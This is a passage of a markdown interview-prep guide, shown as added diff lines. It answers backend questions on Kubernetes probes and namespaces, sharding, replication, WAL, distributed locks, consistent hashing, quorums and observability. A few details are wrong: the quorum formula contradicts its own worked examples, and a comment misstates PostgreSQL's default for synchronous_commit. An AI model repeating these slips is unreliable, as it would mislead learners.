+# NAME      REFERENCE   TARGETS         MINPODS   MAXPODS   REPLICAS   AGE
+# api-hpa   Deployment  45%/50%         3         20        5          10m
+
+kubectl describe hpa api-hpa  # shows scaling events history
+```
+
+**Important:** Pods must have resource requests set (CPU/memory) for HPA to work. HPA looks at requests, not limits.
+
+> 📖 Reference: [HPA — Kubernetes Docs](https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/)
+
+---
+
+**Q29. What is a liveness probe vs a readiness probe in Kubernetes?**
+
+**Answer:**
+
+| | Liveness Probe | Readiness Probe |
+|--|---------------|----------------|
+| Question | "Is this container alive?" | "Is this container ready to serve traffic?" |
+| Action on failure | Kill container + restart | Remove from Service load balancer |
+| When to use | Detect deadlock, infinite loop, hung process | Waiting for DB connection, startup, high load |
+| Effect | Pod restarts | Pod stays running but gets no traffic |
+
+```yaml
+spec:
+  containers:
+  - name: api
+    image: my-app:1.0
+
+    # ── Liveness: is the container healthy? ───────────────────────────
+    # Fails → Kubernetes kills + restarts the container
+    livenessProbe:
+      httpGet:
+        path: /healthz      # simple endpoint: just returns 200 (no DB check!)
+        port: 3000
+      initialDelaySeconds: 30  # wait 30s before first check (give app time to start)
+      periodSeconds: 10        # check every 10 seconds
+      timeoutSeconds: 5        # timeout after 5 seconds
+      failureThreshold: 3      # restart after 3 consecutive failures
+
+    # ── Readiness: is the container ready for traffic? ─────────────────
+    # Fails → removed from Service endpoints (no traffic), NOT restarted
+    readinessProbe:
+      httpGet:
+        path: /ready        # deep check: verifies DB + Redis connectivity
+        port: 3000
+      initialDelaySeconds: 5
+      periodSeconds: 5
+      successThreshold: 1      # 1 success = mark ready
+      failureThreshold: 3      # 3 failures = remove from rotation
+```
+
+```js
+// Liveness endpoint: simple (don't check dependencies!)
+app.get('/healthz', (req, res) => {
+  // Just check the process is alive and event loop is running
+  res.status(200).json({ status: 'alive' });
+  // Don't check DB here — if DB is down, K8s would restart infinitely!
+});
+
+// Readiness endpoint: thorough (check all dependencies)
+app.get('/ready', async (req, res) => {
+  const checks = {};
+
+  try {
+    await db.query('SELECT 1');
+    checks.database = 'ok';
+  } catch {
+    checks.database = 'error';
+  }
+
+  try {
+    await redis.ping();
+    checks.redis = 'ok';
+  } catch {
+    checks.redis = 'error';
+  }
+
+  const ready = Object.values(checks).every(v => v === 'ok');
+  res.status(ready ? 200 : 503).json({ checks });
+  // 503 → K8s removes pod from load balancer (no traffic)
+  // Pod stays running, keeps trying to reconnect
+  // Once DB recovers → probe passes → traffic resumes ✅
+});
+```
+
+> 📖 Reference: [Probes — Kubernetes Docs](https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/)
+
+---
+
+**Q30. What is a Kubernetes namespace? Why is it used?**
+
+**Answer:**
+
+A **namespace** is a virtual cluster within a Kubernetes cluster — a way to partition resources, apply policies, and isolate teams or environments within the same physical cluster.
+
+```bash
+# Default namespaces:
+# default     → where resources go if you don't specify a namespace
+# kube-system → Kubernetes internal components (CoreDNS, kube-proxy)
+# kube-public → publicly readable resources
+```
+
+```yaml
+# Create namespace
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: production
+  labels:
+    environment: production
+
+---
+# Deploy to a specific namespace
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api
+  namespace: production   # ← deploys to production namespace
+```
+
+```bash
+kubectl get pods -n production         # list pods in production namespace
+kubectl get pods -n staging            # list pods in staging namespace
+kubectl get pods --all-namespaces      # list all pods in all namespaces
+
+# Apply resource quotas per namespace (prevent one team from using all cluster resources)
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: team-quota
+  namespace: team-payments
+spec:
+  hard:
+    requests.cpu: "10"          # team can request at most 10 CPUs total
+    requests.memory: 20Gi       # at most 20GB RAM
+    limits.cpu: "20"
+    pods: "50"                  # at most 50 pods
+EOF
+
+# Network policy: namespace isolation
+# By default, all pods in ALL namespaces can talk to each other
+# Add NetworkPolicy to restrict:
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-cross-namespace
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes: [Ingress]
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: production    # only allow traffic from production namespace
+```
+
+**Common patterns:**
+- `production`, `staging`, `development` — environment isolation in one cluster.
+- `team-frontend`, `team-backend`, `team-payments` — team-based isolation.
+- Per-feature-branch namespaces in CI for isolated testing.
+
+> 📖 Reference: [Namespaces — Kubernetes Docs](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/)
+
+---
+
+## 5. Advanced Database Concepts
+
+---
+
+**Q31. What is database sharding? What are the common sharding strategies?**
+
+**Answer:**
+
+**Sharding** is horizontal partitioning of a database across multiple servers (shards). Each shard holds a subset of the data and is independently queryable.
+
+```
+Without sharding:
+All 100M users in one DB server → slow queries, disk full, bottleneck
+
+With sharding (4 shards):
+Shard 0: users 0-25M
+Shard 1: users 25M-50M
+Shard 2: users 50M-75M
+Shard 3: users 75M-100M
+→ Each shard handles 25% of queries → 4x throughput
+```
+
+**Common sharding strategies:**
+
+```js
+// ── 1. Range-based sharding ───────────────────────────────────────────
+// Route by value range of the shard key
+function getShardByUserId(userId) {
+  if (userId < 25_000_000) return shards[0];
+  if (userId < 50_000_000) return shards[1];
+  if (userId < 75_000_000) return shards[2];
+  return shards[3];
+}
+// Pro: simple, good for range queries ("users 1-1000")
+// Con: hotspots (new users always go to last shard)
+
+// ── 2. Hash-based sharding ────────────────────────────────────────────
+// Distribute evenly using hash function
+function getShardByUserIdHash(userId) {
+  return shards[userId % shards.length]; // evenly distributed
+}
+// Pro: even distribution, no hotspots
+// Con: range queries span all shards, resharding is painful
+
+// ── 3. Directory-based sharding ──────────────────────────────────────
+// Lookup table maps entity → shard
+const directory = new Map([
+  ['user:1', 'shard-1'],
+  ['user:2', 'shard-3'],
+  // ...
+]);
+function getShardByLookup(userId) {
+  return directory.get(`user:${userId}`) || assignToLeastLoadedShard(userId);
+}
+// Pro: flexible, can rebalance without rehashing
+// Con: directory itself can become bottleneck
+
+// ── Application-level sharding example ───────────────────────────────
+const shards = [
+  new Pool({ host: 'shard-0.db.internal' }),
+  new Pool({ host: 'shard-1.db.internal' }),
+  new Pool({ host: 'shard-2.db.internal' }),
+  new Pool({ host: 'shard-3.db.internal' }),
+];
+
+async function getUserById(userId) {
+  const shardIndex = userId % shards.length;  // hash sharding
+  const shard = shards[shardIndex];
+  return shard.query('SELECT * FROM users WHERE id = $1', [userId]);
+}
+
+async function getUsersByIds(userIds) {
+  // Group by shard
+  const groups = {};
+  for (const id of userIds) {
+    const shardIndex = id % shards.length;
+    (groups[shardIndex] = groups[shardIndex] || []).push(id);
+  }
+
+  // Query each shard in parallel
+  const results = await Promise.all(
+    Object.entries(groups).map(([shardIndex, ids]) =>
+      shards[shardIndex].query('SELECT * FROM users WHERE id = ANY($1)', [ids])
+    )
+  );
+  return results.flat().map(r => r.rows).flat();
+}
+```
+
+**Sharding challenges:**
+- Cross-shard joins are expensive or impossible — must denormalize.
+- Resharding (adding shards) is complex.
+- Distributed transactions across shards are very hard.
+- Most teams should exhaust vertical scaling and read replicas before sharding.
+
+> 📖 Reference: [Database Sharding — MongoDB](https://www.mongodb.com/features/database-sharding-explained)
+
+---
+
+**Q32. What is database replication? Explain primary-replica (master-slave) replication.**
+
+**Answer:**
+
+**Replication** copies data from one database server (primary) to one or more servers (replicas) to provide high availability, read scaling, and disaster recovery.
+
+```
+Primary-Replica Architecture:
+
+              ┌────────────────┐
+Write → ──────►  Primary DB    ├──► Replica 1 (read-only)
+              │  (read+write)  ├──► Replica 2 (read-only)
+              └────────────────┘──► Replica 3 (read-only, different region)
+
+Reads → routed to any replica
+Writes → always go to primary
+```
+
+**How it works (PostgreSQL streaming replication):**
+
+```
+1. Application writes to primary DB
+2. Primary writes change to WAL (Write-Ahead Log) — a sequential log of all changes
+3. WAL records streamed to replica in real-time
+4. Replica applies WAL records to its own data → stays in sync
+5. Replication lag: how far behind the replica is (typically 0-100ms)
+```
+
+```yaml
+# PostgreSQL replication config (postgresql.conf on primary)
+wal_level = replica             # enable WAL for replication
+max_wal_senders = 5             # allow 5 replica connections
+wal_keep_size = 512MB           # keep 512MB of WAL for replicas to catch up
+
+# pg_hba.conf on primary (allow replica to connect)
+host replication replicator 10.0.1.20/32 md5
+
+# On replica (recovery.conf or postgresql.conf)
+primary_conninfo = 'host=primary.db.internal user=replicator password=xxx'
+hot_standby = on   # allow read queries on replica
+```
+
+```js
+// Application-level: route reads to replicas
+const primary = new Pool({ host: 'primary.db.internal' });
+const replica = new Pool({ host: 'replica.db.internal' });
+
+// Write: must go to primary
+async function createUser(data) {
+  return primary.query('INSERT INTO users ... RETURNING *', [data]);
+}
+
+// Read: can go to replica (eventual consistency acceptable)
+async function getUserById(id) {
+  return replica.query('SELECT * FROM users WHERE id = $1', [id]);
+}
+
+// Read-your-own-writes: use primary for immediate consistency
+async function register(data) {
+  const user = await primary.query('INSERT INTO users ... RETURNING *', [data]);
+  return primary.query('SELECT * FROM users WHERE id = $1', [user.rows[0].id]);
+  // Use primary for the read that immediately follows the write
+}
+```
+
+**Failover:**
+When primary goes down, a replica is promoted to primary. This can be automated with tools like Patroni (PostgreSQL), AWS RDS Multi-AZ (automatic), or orchestrated manually.
+
+> 📖 Reference: [DB Replication — PostgreSQL Docs](https://www.postgresql.org/docs/current/high-availability.html)
+
+---
+
+**Q33. What is a write-ahead log (WAL)? How does it ensure durability?**
+
+**Answer:**
+
+The **Write-Ahead Log (WAL)** is a sequential, append-only log file where every database change is written **before** it's applied to the actual data files. It is the backbone of durability (the "D" in ACID) and replication.
+
+**Why it ensures durability:**
+
+```
+Without WAL:
+1. Transaction begins
+2. Data files updated in memory (buffer pool)
+3. If server crashes HERE → changes in memory are lost! Data file partially updated!
+4. Database is corrupt on restart
+
+With WAL:
+1. Transaction begins
+2. Changes written to WAL on disk (sequential, fast)
+   fsync: WAL is physically durable before step 3
+3. COMMIT returned to client ← "Your data is safe" (WAL is durable)
+4. Data files updated asynchronously from WAL
+5. If server crashes between 3 and 4: WAL is intact → replay WAL on restart → no data loss ✅
+```
+
+```sql
+-- PostgreSQL WAL configuration
+-- postgresql.conf
+wal_level = replica               -- minimal, replica, or logical
+synchronous_commit = on           -- wait for WAL flush before COMMIT returns (safe)
+fsync = on                        -- force WAL to disk (never turn off in production!)
+checkpoint_completion_target = 0.9 -- spread checkpoint I/O over 90% of checkpoint interval
+
+-- WAL files: /var/lib/postgresql/data/pg_wal/
+-- Each file is 16MB by default
+-- Named: 000000010000000000000001, 000000010000000000000002, ...
+
+-- Check WAL position
+SELECT pg_current_wal_lsn();   -- current WAL Log Sequence Number
+SELECT pg_walfile_name(pg_current_wal_lsn()); -- current WAL file name
+
+-- Monitor WAL generation rate (helps right-size disk)
+SELECT * FROM pg_stat_bgwriter;
+```
+
+**WAL uses beyond durability:**
+1. **Replication:** Replicas receive WAL stream from primary → stay in sync.
+2. **Point-in-time recovery:** Replay WAL from a backup to any specific moment.
+3. **Logical decoding:** CDC tools (Debezium) read WAL to stream changes to Kafka.
+4. **Crash recovery:** On startup after crash, replay WAL from last checkpoint.
+
+> 📖 Reference: [WAL — PostgreSQL Docs](https://www.postgresql.org/docs/current/wal-intro.html)
+
+---
+
+**Q34. What is the difference between synchronous and asynchronous replication?**
+
+**Answer:**
+
+| | Synchronous Replication | Asynchronous Replication |
+|--|------------------------|------------------------|
+| When primary commits | After replica confirms WAL written | Immediately (doesn't wait for replica) |
+| Write latency | Higher (waits for replica ACK) | Lower (no waiting) |
+| Data loss on primary failure | Zero (replica is up-to-date) | Possible (in-flight changes lost) |
+| Replica availability required | Yes (primary blocks if replica down) | No |
+| Use case | Financial data, anything where data loss is unacceptable | Read scaling, analytics, DR with RPO > 0 |
+
+```sql
+-- PostgreSQL: configure synchronous replication
+-- postgresql.conf on primary:
+synchronous_commit = on               -- default: async
+synchronous_standby_names = 'replica1' -- wait for replica1 to confirm
+
+-- Per-transaction control (flexibility):
+BEGIN;
+SET LOCAL synchronous_commit = ON;    -- this transaction: synchronous (safe)
+INSERT INTO payments ...;
+COMMIT;
+
+BEGIN;
+SET LOCAL synchronous_commit = OFF;   -- this transaction: async (faster)
+INSERT INTO audit_logs ...;           -- audit logs can lag slightly
+COMMIT;
+```
+
+```
+Synchronous flow:
+Client → BEGIN; INSERT; COMMIT → Primary writes WAL → Sends WAL to Replica
+                                                        Replica confirms WAL written
+                                                                    ↓
+Client ← "COMMIT" ← Primary ← Replica ACK
+(Client doesn't get COMMIT until replica has the data)
+Latency: primary + 1 network round trip to replica
+
+Asynchronous flow:
+Client → BEGIN; INSERT; COMMIT → Primary writes WAL → "COMMIT" → Client
+                                Primary sends WAL to Replica asynchronously
+                                (Client doesn't wait for replica)
+Latency: primary only (much faster)
+Risk: If primary crashes before replica receives WAL → last few transactions lost (RPO > 0)
+```
+
+**AWS RDS Multi-AZ:**
+- Uses synchronous replication within an AZ pair.
+- Automatic failover in 60-120 seconds.
+- Zero data loss (RPO = 0) because standby is always in sync.
+
+> 📖 Reference: [Sync vs Async Replication — AWS](https://aws.amazon.com/rds/features/multi-az/)
+
+---
+
+**Q35. What is a time-series database? When would you choose one over a relational DB?**
+
+**Answer:**
+
+A **time-series database (TSDB)** is optimized for storing and querying data that is indexed primarily by time — metrics, sensor readings, financial ticks, IoT telemetry.
+
+```
+Time-series data shape:
+timestamp          | metric            | value | tags
+2024-06-01 12:00:00 | cpu.utilization   | 45.2  | host=web-01, env=prod
+2024-06-01 12:00:05 | cpu.utilization   | 47.8  | host=web-01, env=prod
+2024-06-01 12:00:10 | cpu.utilization   | 43.1  | host=web-01, env=prod
+```
+
+**Why relational DBs are bad for time-series at scale:**
+
+```sql
+-- Naive PostgreSQL approach: millions of rows per day
+-- cpu_metrics table: timestamp, host, metric, value
+-- Problem 1: index bloat — B-tree on timestamp becomes huge
+-- Problem 2: old data never queried but takes space — need range partitioning
+-- Problem 3: no built-in downsampling ("average per hour" of "per-second" data)
+-- Problem 4: no compression for similar values (45.2, 45.3, 45.1 stored 3 times)
+```
+
+**InfluxDB example:**
+
+```js
+const { InfluxDB, Point } = require('@influxdata/influxdb-client');
+const influx = new InfluxDB({ url: 'http://influxdb:8086', token: process.env.INFLUX_TOKEN });
+
+const writeApi = influx.getWriteApi('my-org', 'metrics');
+
+// Write a metric
+const point = new Point('cpu_utilization')
+  .tag('host', 'web-01')
+  .tag('env', 'production')
+  .floatField('value', 45.2)
+  .timestamp(new Date());
+
+writeApi.writePoint(point);
+await writeApi.flush();
+
+// Query: InfluxDB Flux language
+const queryApi = influx.getQueryApi('my-org');
+const fluxQuery = `
+  from(bucket: "metrics")
+    |> range(start: -1h)
+    |> filter(fn: (r) => r._measurement == "cpu_utilization")
+    |> filter(fn: (r) => r.host == "web-01")
+    |> aggregateWindow(every: 5m, fn: mean)   // 5-minute averages
+    |> yield(name: "mean")
+`;
+const rows = await queryApi.collectRows(fluxQuery);
+```
+
+**TSDB-specific features (absent in relational DBs):**
+- **Automatic downsampling:** Store raw 1-second data for 1 week, then aggregate to 1-minute for 1 year.
+- **Compression:** delta encoding, run-length encoding for similar timestamps/values → 90% size reduction.
+- **Time-range queries:** `WHERE time > NOW() - 1h` optimized with time-partitioned storage.
+- **Functions:** `rate()`, `increase()`, `rolling_average()` built-in.
+
+**When to choose a TSDB:**
+- Monitoring/metrics (Prometheus → InfluxDB/TimescaleDB/VictoriaMetrics).
+- IoT sensor data (millions of data points per second).
+- Financial tick data.
+- Application performance monitoring.
+
+> 📖 Reference: [Time-Series Databases — InfluxData](https://www.influxdata.com/time-series-database/)
+
+---
+
+## 6. Distributed Systems Fundamentals
+
+---
+
+**Q36. What is the two-generals problem? What does it tell us about distributed systems?**
+
+**Answer:**
+
+**The Two Generals Problem** is a classic thought experiment showing that it is **impossible to achieve reliable consensus** over an unreliable communication channel.
+
+**The scenario:**
+Two armies (General A and General B) must attack a city simultaneously to win. They can only communicate via messengers through enemy territory. Any messenger might be captured.
+
+```
+General A → "Attack at dawn?" → messenger → General B
+            (might be captured)
+
+General B → "Agreed, attack at dawn!" → messenger → General A
+            (might be captured)
+
+General A needs to know B got the message before attacking.
+But B needs confirmation that A received B's confirmation.
+But A needs confirmation that B received A's confirmation... (infinite regress!)
+
+No matter how many acknowledgments they exchange:
+The last message might not arrive → neither can be 100% certain the other will attack
+```
+
+**What it tells us about distributed systems:**
+
+```
+It proves that perfect reliability over unreliable networks is IMPOSSIBLE.
+
+Real implications for backends:
+
+1. "Did the payment go through?"
+   Client sends payment → server processes → server sends response → NETWORK DROPS
+   Was payment charged? Did the client get the response?
+   You can never be 100% certain without idempotency keys + retry logic.
+
+2. "Did the database write succeed?"
+   App writes to DB → DB commits → "COMMIT" response → NETWORK DROPS
+   Data IS in the DB, but the app doesn't know!
+   Next retry → duplicate write → two orders created!
+   Solution: idempotency keys, unique constraints, optimistic locking.
+
+3. Distributed consensus is hard
+   This is why Raft and Paxos are complex algorithms.
+   They don't "solve" the two-generals problem — they work around it with:
+   - Quorums (majority agreement)
+   - Leader election
+   - Bounded message loss assumptions
+
+// Practical takeaways:
+// 1. Design every external call to be idempotent (safe to retry)
+// 2. Use idempotency keys for operations with side effects (payments, emails)
+// 3. Accept eventual consistency — "maybe" is the fundamental state of distributed systems
+// 4. Build retry logic everywhere, but make handlers idempotent first
+```
+
+> 📖 Reference: [Two Generals Problem — Wikipedia](https://en.wikipedia.org/wiki/Two_Generals%27_Problem)
+
+---
+
+**Q37. What is a distributed lock? How would you implement one using Redis?**
+
+**Answer:**
+
+A **distributed lock** ensures that only ONE process (across multiple servers/pods) can execute a critical section at a time — preventing race conditions in distributed systems.
+
+```
+Problem without distributed lock:
+Pod 1: checks "is job running?" → No → starts job
+Pod 2: checks "is job running?" → No (Pod 1 just started, not yet marked!)
+→ Both pods run the same job simultaneously → duplicate processing!
+
+With distributed lock:
+Pod 1: acquires lock "job:invoice-gen" → starts job
+Pod 2: tries to acquire "job:invoice-gen" → fails → waits/skips
+→ Only one pod runs the job ✅
+```
+
+**Redis-based distributed lock:**
+
+```js
+const redis = require('ioredis');
+const client = new redis();
+
+class DistributedLock {
+  constructor(client) {
+    this.client = client;
+  }
+
+  async acquire(lockKey, ttlMs = 30000) {
+    const lockValue = crypto.randomUUID(); // unique value to identify this lock owner
+
+    // SET NX EX: set only if Not eXists, with EXpiry
+    // Atomic operation — either we get the lock or we don't
+    const result = await this.client.set(
+      `lock:${lockKey}`,
+      lockValue,
+      'NX',           // only set if key doesn't exist
+      'PX',           // expiry in milliseconds
+      ttlMs           // auto-release after ttlMs (prevents deadlock if process dies)
+    );
+
+    if (result === 'OK') {
+      return lockValue; // return our unique value (needed to release safely)
+    }
+    return null; // lock not acquired — someone else has it
+  }
+
+  async release(lockKey, lockValue) {
+    // Use Lua script for atomic check-and-delete
+    // Never delete a lock you don't own!
+    const luaScript = `
+      if redis.call("GET", KEYS[1]) == ARGV[1] then
+        return redis.call("DEL", KEYS[1])
+      else
+        return 0
+      end
+    `;
+    // This atomically: checks the lock value, deletes ONLY if it's ours
+    await this.client.eval(luaScript, 1, `lock:${lockKey}`, lockValue);
+  }
+
+  async withLock(lockKey, fn, options = {}) {
+    const { ttlMs = 30000, retryMs = 100, maxRetries = 10 } = options;
+
+    for (let attempt = 0; attempt < maxRetries; attempt++) {
+      const lockValue = await this.acquire(lockKey, ttlMs);
+
+      if (lockValue) {
+        try {
+          return await fn(); // execute the critical section
+        } finally {
+          await this.release(lockKey, lockValue); // always release
+        }
+      }
+
+      // Lock not available — wait and retry
+      await new Promise(r => setTimeout(r, retryMs * (attempt + 1)));
+    }
+
+    throw new Error(`Could not acquire lock on ${lockKey} after ${maxRetries} attempts`);
+  }
+}
+
+const lock = new DistributedLock(client);
+
+// Usage: only one pod generates the invoice at a time
+app.post('/billing/generate', async (req, res) => {
+  const { userId, month } = req.body;
+
+  await lock.withLock(`invoice:${userId}:${month}`, async () => {
+    // This block runs on exactly ONE pod at a time
+    const existing = await Invoice.findOne({ userId, month });
+    if (existing) return existing; // already generated
+
+    return Invoice.create({ userId, month, amount: calculateBill(userId, month) });
+  }, { ttlMs: 60000, maxRetries: 3 });
+
+  res.json({ success: true });
+});
+
+// For production: use Redlock algorithm (multi-node Redis for fault tolerance)
+// https://redis.io/docs/manual/patterns/distributed-locks/#the-redlock-algorithm
+const Redlock = require('redlock');
+const redlock = new Redlock([client1, client2, client3]); // 3 Redis nodes
+const lock = await redlock.acquire(['lock:invoice-gen'], 30000);
+try { /* critical section */ }
+finally { await lock.release(); }
+```
+
+> 📖 Reference: [Redlock Algorithm — Redis Docs](https://redis.io/docs/manual/patterns/distributed-locks/)
+
+---
+
+**Q38. What is consistent hashing? How is it used in distributed caching?**
+
+**Answer:**
+
+**Consistent hashing** is an algorithm for distributing data across nodes in a way that minimizes redistribution when nodes are added or removed.
+
+**Problem with naive hash-based distribution:**
+
+```
+5 cache nodes. Key → node using: hash(key) % 5
+
+Add a 6th node:
+hash(key) % 5 → hash(key) % 6 → DIFFERENT RESULT for almost every key!
+→ ~83% of keys map to wrong node → massive cache miss storm → DB hammered
+```
+
+**Consistent hashing solution:**
+
+```
+Imagine a ring (0 to 2^32).
+Each node is placed at multiple positions on the ring (virtual nodes).
+Each key is hashed to a position on the ring.
+Key → find the nearest node clockwise.
+
+           Node A (12 o'clock)
+          /                   \
+Node D                         Node B
+(9 o'clock)                    (3 o'clock)
+          \                   /
+           Node C (6 o'clock)
+
+Key X hashes to 1:30 position → assigned to Node B (nearest clockwise)
+
+Adding Node E at 2 o'clock:
+Only keys that were between 12 o'clock and 2 o'clock move from B to E
+→ Only ~25% of keys remapped instead of ~83% ✅
+```
+
+```js
+// Consistent hashing implementation
+const crypto = require('crypto');
+
+class ConsistentHashRing {
+  constructor(nodes, virtualNodes = 150) {
+    this.ring = new Map();       // position → node
+    this.sortedKeys = [];        // sorted ring positions
+    this.virtualNodes = virtualNodes;
+
+    for (const node of nodes) this.addNode(node);
+  }
+
+  hash(key) {
+    return parseInt(
+      crypto.createHash('md5').update(key).digest('hex').slice(0, 8),
+      16
+    );
+  }
+
+  addNode(node) {
+    for (let i = 0; i < this.virtualNodes; i++) {
+      const position = this.hash(`${node}:${i}`);
+      this.ring.set(position, node);
+      this.sortedKeys.push(position);
+    }
+    this.sortedKeys.sort((a, b) => a - b);
+  }
+
+  removeNode(node) {
+    for (let i = 0; i < this.virtualNodes; i++) {
+      const position = this.hash(`${node}:${i}`);
+      this.ring.delete(position);
+    }
+    this.sortedKeys = this.sortedKeys.filter(k => this.ring.has(k));
+  }
+
+  getNode(key) {
+    const hash = this.hash(key);
+    // Find first node position >= hash (clockwise)
+    const idx = this.sortedKeys.findIndex(pos => pos >= hash);
+    const pos = idx === -1 ? this.sortedKeys[0] : this.sortedKeys[idx];
+    return this.ring.get(pos);
+  }
+}
+
+// Usage: distributed cache routing
+const ring = new ConsistentHashRing(['redis-1:6379', 'redis-2:6379', 'redis-3:6379']);
+
+async function cacheGet(key) {
+  const node = ring.getNode(key);
+  const redis = redisConnections[node];
+  return redis.get(key);
+}
+
+async function cacheSet(key, value, ttl) {
+  const node = ring.getNode(key);
+  const redis = redisConnections[node];
+  return redis.setex(key, ttl, value);
+}
+
+// 'user:42' → always maps to redis-2 (consistent!)
+// Add redis-4: only ~25% of keys remapped → minimal disruption
+```
+
+> 📖 Reference: [Consistent Hashing — Tom White](https://tom-e-white.com/2007/11/consistent-hashing.html)
+
+---
+
+**Q39. What is a quorum in distributed systems? How does it relate to consistency?**
+
+**Answer:**
+
+A **quorum** is the minimum number of nodes that must participate in an operation for it to be considered valid. Quorum-based systems ensure that any two operations share at least one common node — guaranteeing consistency.
+
+**Formula:** For N nodes, quorum = ⌈N/2⌉ + 1 (majority)
+
+```
+3 nodes: quorum = 2 (majority of 3)
+5 nodes: quorum = 3 (majority of 5)
+7 nodes: quorum = 4 (majority of 7)
+```
+
+**Why quorum ensures consistency:**
+
+```
+5-node Cassandra cluster. Write quorum = 3. Read quorum = 3.
+
+Write: client writes to 3 of 5 nodes
+  Node1 ✅, Node2 ✅, Node3 ✅, Node4 (not written), Node5 (not written)
+  Write succeeds when 3 respond ✅
+
+Read: client reads from 3 of 5 nodes
+  Node1 ✅, Node2 ✅, Node4 ✅ (at least 2 of these have the latest value)
+  Read returns the latest value ✅
+
+Why? Write quorum (3) + Read quorum (3) > N (5)
+     → They MUST overlap by at least 1 node
+     → That node has the latest data
+     → Consistency guaranteed ✅
+```
+
+**Cassandra quorum levels:**
+
+```js
+const cassandra = require('cassandra-driver');
+const consistencies = cassandra.types.consistencies;
+
+// ONE: fastest, lowest consistency (any 1 replica responds)
+await client.execute(query, params, { consistency: consistencies.one });
+
+// QUORUM: majority of replicas (balanced speed/consistency)
+await client.execute(query, params, { consistency: consistencies.quorum });
+
+// ALL: all replicas must respond (slowest, highest consistency)
+await client.execute(query, params, { consistency: consistencies.all });
+
+// LOCAL_QUORUM: quorum within local datacenter only (good for multi-region)
+await client.execute(query, params, { consistency: consistencies.localQuorum });
+```
+
+**Trade-off (Quorum vs ONE):**
+
+```
+quorum read + quorum write = strong consistency (always get latest write)
+one read + one write = eventual consistency (may get stale data, but fastest)
+
+Tunable consistency: choose per-operation based on business need
+- Bank balance: QUORUM (must be accurate)
+- "Online users" indicator: ONE (slight staleness ok)
+```
+
+> 📖 Reference: [Quorum — Martin Fowler](https://martinfowler.com/articles/patterns-of-distributed-systems/quorum.html)
+
+---
+
+**Q40. What is the difference between a synchronous and an asynchronous distributed system?**
+
+**Answer:**
+
+| | Synchronous | Asynchronous |
+|--|------------|-------------|
+| Message timing | Messages arrive within known bounded time | Messages may arrive at any time (unbounded delay) |
+| Clock assumptions | Clocks synchronized, bounded drift | No clock assumptions |
+| Failure detection | Reliable (timeout = failure) | Unreliable (timeout ≠ failure, just slow) |
+| Consensus | Easier (FLP doesn't apply with timing bounds) | Impossible (FLP impossibility theorem) |
+| Real-world example | Idealized model (rare in practice) | The actual internet |
+
+**In practice — the real internet is asynchronous:**
+
+```js
+// Asynchronous system problem: timeout ≠ failure
+async function callPaymentService(orderId, amount) {
+  try {
+    const result = await fetch('http://payment-service/charge', {
+      method: 'POST',
+      body: JSON.stringify({ orderId, amount }),
+      signal: AbortSignal.timeout(5000) // 5 second timeout
+    });
+    return await result.json();
+  } catch (err) {
+    if (err.name === 'TimeoutError') {
+      // ❌ We DON'T know if the payment went through or not!
+      // The request may have been received and processed AFTER our timeout
+      // Retrying without idempotency → double charge!
+      throw new Error('Payment service timed out — status unknown');
+    }
+  }
+}
+
+// ✅ Correct handling in asynchronous systems:
+async function callPaymentServiceIdempotent(orderId, amount) {
+  const idempotencyKey = `payment:${orderId}`;  // deterministic key
+
+  try {
+    return await fetch('http://payment-service/charge', {
+      method: 'POST',
+      headers: { 'Idempotency-Key': idempotencyKey },
+      body: JSON.stringify({ orderId, amount }),
+      signal: AbortSignal.timeout(5000)
+    }).then(r => r.json());
+  } catch (err) {
+    // Safe to retry with the same idempotency key
+    // If payment went through: service returns same response
+    // If it didn't: service processes it now
+    return await retryWithBackoff(() =>
+      fetch('http://payment-service/charge', {
+        headers: { 'Idempotency-Key': idempotencyKey },
+        ...
+      })
+    );
+  }
+}
+```
+
+**Key lesson:** In real distributed systems (which are always partially asynchronous):
+- Timeouts don't mean failure — just "we don't know yet."
+- Design for idempotency and retries.
+- Accept that you cannot achieve perfect consistency without coordination overhead.
+- This is why Kafka at-least-once delivery + idempotent consumers is the standard pattern.
+
+> 📖 Reference: [Distributed Systems — Kleppmann Book](https://dataintensive.net/)
+
+---
+
+## 7. Observability — Logs, Metrics, Traces
+
+---
+
+**Q41. What are the three pillars of observability? Explain logs, metrics, and traces.**
+
+**Answer:**
+
+**Observability** is the ability to understand the internal state of a system from its external outputs. The three pillars provide complementary views:
+
+```
+Logs:   What happened?        → Discrete events with context
+Metrics: How much/many/fast? → Aggregated numbers over time
+Traces:  Where did it happen? → Request journey across services
+```
+
+**1. Logs — structured event records:**
+
+```js
+// Structured logs (JSON) — queryable in production
+logger.info('Payment processed', {
+  orderId:       'ord-123',
+  userId:        42,
+  amount:        150.00,
+  currency:      'USD',
+  processorId:   'stripe',
+  duration_ms:   245,
+  requestId:     'req-abc-xyz',
+  timestamp:     '2024-06-01T12:00:00.123Z'
+});
+// Query in Datadog: @orderId:ord-123 AND @amount:>100 AND @status:failed
+```
+
+**2. Metrics — time-series numbers:**
+
+```js
+// Prometheus metrics
+const prometheus = require('prom-client');
+
+// Counter: monotonically increasing (never decreases)
+const httpRequestsTotal = new prometheus.Counter({
+  name: 'http_requests_total',
+  help: 'Total HTTP requests',
+  labelNames: ['method', 'route', 'status_code']
+});
+
+// Histogram: distribution of values (latency, request size)
+const httpRequestDuration = new prometheus.Histogram({
+  name: 'http_request_duration_seconds',
+  help: 'HTTP request duration',
+  labelNames: ['method', 'route'],
+  buckets: [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5]
+});
+
+// Gauge: can go up or down (memory, active connections)
+const activeConnections = new prometheus.Gauge({
+  name: 'active_db_connections',
+  help: 'Active database connections'
+});
+
+app.use((req, res, next) => {
+  const end = httpRequestDuration.startTimer({ method: req.method, route: req.route?.path });
+  res.on('finish', () => {
+    end(); // record duration
+    httpRequestsTotal.inc({ method: req.method, route: req.route?.path, status_code: res.statusCode });
+  });
+  next();
+});
+```
+
+**3. Traces — request journey across services:**
+
+```js
+// OpenTelemetry distributed tracing
+const { trace } = require('@opentelemetry/api');
+const tracer = trace.getTracer('order-service');
+
